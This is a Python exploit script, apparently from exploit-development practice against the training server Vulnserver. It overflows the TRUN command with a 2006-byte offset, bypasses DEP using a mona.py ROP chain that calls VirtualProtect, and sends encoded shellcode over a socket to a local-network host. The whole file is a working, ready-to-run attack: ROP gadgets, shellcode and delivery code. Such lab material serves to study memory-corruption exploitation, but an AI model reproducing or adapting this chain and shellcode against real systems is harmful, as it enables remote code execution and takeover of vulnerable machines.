#!/usr/bin/python

import socket, struct

def create_rop_chain():

	# rop chain generated with mona.py - www.corelan.be
	rop_gadgets = [
	  #[---INFO:gadgets_to_set_esi:---]
	  0x6250120c,  # POP ECX # RETN [essfunc.dll] 
	  0x6250609c,  # ptr to &VirtualProtect() [IAT essfunc.dll]
	  0x771afd52,  # MOV ESI,DWORD PTR DS:[ECX] # ADD DH,DH # RETN [MSCTF.dll] ** REBASED ** ASLR 
	  #[---INFO:gadgets_to_set_ebp:---]
	  0x7726b093,  # POP EBP # RETN [msvcrt.dll] ** REBASED ** ASLR 
	  0x625011bb,  # & jmp esp [essfunc.dll]
	  #[---INFO:gadgets_to_set_ebx:---]
	  0x75cf69a6,  # POP EAX # RETN [kernel32.dll] ** REBASED ** ASLR 
	  0xfffffdff,  # Value to negate, will become 0x00000201
	  0x771b4cbd,  # NEG EAX # RETN [MSCTF.dll] ** REBASED ** ASLR 
	  0x771af9f1,  # XCHG EAX,EBX # RETN [MSCTF.dll] ** REBASED ** ASLR 
	  #[---INFO:gadgets_to_set_edx:---]
	  0x772efd06,  # POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR 
	  0xffffffc0,  # Value to negate, will become 0x00000040
	  0x77192fd0,  # NEG EAX # RETN [MSCTF.dll] ** REBASED ** ASLR 
	  0x75c8bd3a,  # XCHG EAX,EDX # RETN [kernel32.dll] ** REBASED ** ASLR 
	  #[---INFO:gadgets_to_set_ecx:---]
	  0x772c89e0,  # POP ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
	  0x625046d9,  # &Writable location [essfunc.dll]
	  #[---INFO:gadgets_to_set_edi:---]
	  0x772cf962,  # POP EDI # RETN [msvcrt.dll] ** REBASED ** ASLR 
	  0x770c4804,  # RETN (ROP NOP) [user32.dll] ** REBASED ** ASLR
	  #[---INFO:gadgets_to_set_eax:---]
	  0x772efd06,  # POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR 
	  0x90909090,  # nop
	  #[---INFO:pushad:---]
	  0x76bbf59c,  # PUSHAD # RETN [USP10.dll] ** REBASED ** ASLR 
	]
	return b''.join(struct.pack('<I', _) for _ in rop_gadgets)

rop_chain = create_rop_chain()

import socket

shellcode = b""
shellcode += b"\xdb\xd3\xbb\x5d\xb6\xf0\x8c\xd9\x74\x24\xf4"
shellcode += b"\x5f\x29\xc9\xb1\x59\x83\xc7\x04\x31\x5f\x15"
shellcode += b"\x03\x5f\x15\xbf\x43\x0c\x64\xb0\xac\xed\x75"
shellcode += b"\xae\x9d\x3f\x11\xa5\x8c\x8f\x51\xeb\x3c\x79"
shellcode += b"\x80\x80\x6f\x6d\xc0\xe4\xa7\xbc\x29\x07\x0f"
shellcode += b"\xf4\xf3\x26\xaf\xa5\xc0\x29\x53\xb4\x14\x89"
shellcode += b"\x6a\x77\x69\xc8\xab\xc1\x07\x25\x61\x85\x6c"
shellcode += b"\xeb\x96\xa2\x31\x37\x96\x64\x3e\x07\xe0\x01"
shellcode += b"\x81\xf3\x5c\x0b\xd2\xab\xd7\x43\xca\xc0\xb0"
shellcode += b"\x73\xeb\x05\xc5\xbd\x9f\x95\x8f\xb6\x54\x6e"
shellcode += b"\x3e\x36\x95\xa6\x70\x08\x57\x89\x7e\x24\x59"
shellcode += b"\xd2\xb9\xd4\x2f\x28\xba\x69\x28\xeb\xc0\xb5"
shellcode += b"\xbd\xeb\x63\x3d\x65\xcf\x92\x92\xf0\x84\x99"
shellcode += b"\x5f\x76\xc2\xbd\x5e\x5b\x79\xb9\xeb\x5a\xad"
shellcode += b"\x4b\xaf\x78\x69\x17\x6b\xe0\x28\xfd\xda\x1d"
shellcode += b"\x2a\x59\x82\xbb\x21\x48\xd5\xbc\xca\x92\xda"
shellcode += b"\xe0\x5c\x5e\x17\x1b\x9c\xc8\x20\x68\xae\x57"
shellcode += b"\x9b\xe6\x82\x10\x05\xf0\x93\x37\xb6\x2e\x1b"
shellcode += b"\x57\x48\xcf\x5b\x71\x8f\x9b\x0b\xe9\x26\xa4"
shellcode += b"\xc0\xe9\xc7\x71\x7c\xe0\x5f\xba\x28\x7d\x1d"
shellcode += b"\x52\x2a\x7e\x33\xff\xa3\x98\x63\xaf\xe3\x34"
shellcode += b"\xc4\x1f\x43\xe5\xac\x75\x4c\xda\xcd\x75\x87"
shellcode += b"\x73\x67\x9a\x71\x2b\x10\x03\xd8\xa7\x81\xcc"
shellcode += b"\xf7\xcd\x82\x47\xfd\x32\x4c\xa0\x74\x21\xb9"
shellcode += b"\xd7\x76\xb9\x3a\x72\x76\xd3\x3e\xd4\x21\x4b"
shellcode += b"\x3d\x01\x05\xd4\xbe\x64\x16\x13\x40\xf9\x2e"
shellcode += b"\x6f\x77\x6f\x0e\x07\x78\x7f\x8e\xd7\x2e\x15"
shellcode += b"\x8e\xbf\x96\x4d\xdd\xda\xd8\x5b\x72\x77\x4d"
shellcode += b"\x64\x22\x2b\xc6\x0c\xc8\x12\x20\x93\x33\x71"
shellcode += b"\x32\xd4\xcb\x07\x1d\x7d\xa3\xf7\x1d\x7d\x33"
shellcode += b"\x92\x9d\x2d\x5b\x69\xb1\xc2\xab\x92\x18\x8b"
shellcode += b"\xa3\x19\xcd\x79\x52\x1d\xc4\xdc\xca\x1e\xeb"
shellcode += b"\xc4\xfd\x65\x84\xfb\xfe\x99\x8c\x9f\xff\x99"
shellcode += b"\xb0\xa1\x3c\x4c\x89\xd7\x03\x4c\xae\xe8\x36"
shellcode += b"\xf1\x87\x62\x38\xa5\xd8\xa6"


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("192.168.137.139", 9999))

buffer = b"A"*2006
# buffer += b"\xAF\x11\x50\x62"
buffer += rop_chain
buffer += b"\x90"*16
buffer += shellcode
buffer += b"F"*(3000-len(buffer))

print(sock.recv(1024))
sock.send((b"TRUN ." + buffer + b"\r\n"))
print(sock.recv(1024))
sock.send("EXIT\r\n")

sock.close()